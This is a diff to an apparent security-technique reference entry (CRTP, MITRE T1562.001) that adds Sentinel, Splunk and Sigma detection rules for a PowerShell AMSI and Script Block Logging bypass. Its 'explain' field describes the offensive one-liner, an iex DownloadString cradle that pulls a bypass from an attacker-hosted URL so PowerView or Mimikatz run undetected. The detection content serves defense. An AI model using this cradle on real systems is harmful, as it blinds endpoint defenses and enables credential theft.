@@ -110,7 +110,95 @@
       "CRTP",
       "MITRE T1562.001",
       "MITRE T1059.001"
-    ]
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "AMSI & Script Block Logging Bypass (one-liner) - Sentinel",
+        "logic": "DeviceEvents\n| where ActionType == \"PowerShellCommand\"\n| where ProcessCommandLine has_any (\"amsiInitFailed\",\"AmsiUtils\",\"DownloadString\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine\n| sort by Timestamp desc",
+        "data_source": "powershell",
+        "attack": [
+          "T1562.001",
+          "T1685",
+          "T1059.001",
+          "T1140"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "AMSI & Script Block Logging Bypass (one-liner) (1) - Splunk",
+        "logic": "index=wineventlog EventCode=4104 (ScriptBlockText=\"*DownloadString*\" OR ScriptBlockText=\"*amsiInitFailed*\" OR ScriptBlockText=\"*System.Management.Automation.AmsiUtils*\")\n| table _time, Computer, User, ScriptBlockText",
+        "data_source": "powershell",
+        "attack": [
+          "T1562.001",
+          "T1685",
+          "T1059.001",
+          "T1140"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "4104"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "AMSI & Script Block Logging Bypass (one-liner) (2) - Splunk",
+        "logic": "index=sysmon EventCode=3 Image=\"*powershell.exe\" DestinationPort=80\n| table _time, Computer, DestinationIp, DestinationHostname",
+        "data_source": "sysmon",
+        "attack": [
+          "T1562.001",
+          "T1685",
+          "T1059.001",
+          "T1140"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "3"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "posh_ps_amsi_bypass",
+        "logic": "posh_ps_amsi_bypass",
+        "data_source": "windows-security",
+        "attack": [
+          "T1562.001",
+          "T1685",
+          "T1059.001",
+          "T1140"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "sigma",
+        "name": "posh_ps_download_iex",
+        "logic": "posh_ps_download_iex",
+        "data_source": "windows-security",
+        "attack": [
+          "T1562.001",
+          "T1685",
+          "T1059.001",
+          "T1140"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "powershell",
+        "sysmon",
+        "windows-security"
+      ],
+      "better_with": [
+        "edr"
+      ]
+    }
   },
   "explain": "Downloads and executes an in-memory patch that blinds PowerShell defenses before you load tooling:\n  iex (New-Object System.Net.WebClient).DownloadString('...')   fetch the bypass text and run it in this session, nothing touches disk\n  http://<attacker_ip>/<amsi_bypass>.txt   your hosted one-liner (CRTP serves sbloggingbypass.txt and Amsi-Byp.txt)\nAfter it runs, AMSI (AmsiScanBuffer) and Script Block Logging are disabled for the session, so you can iex PowerView/Mimikatz without alerts."
 }
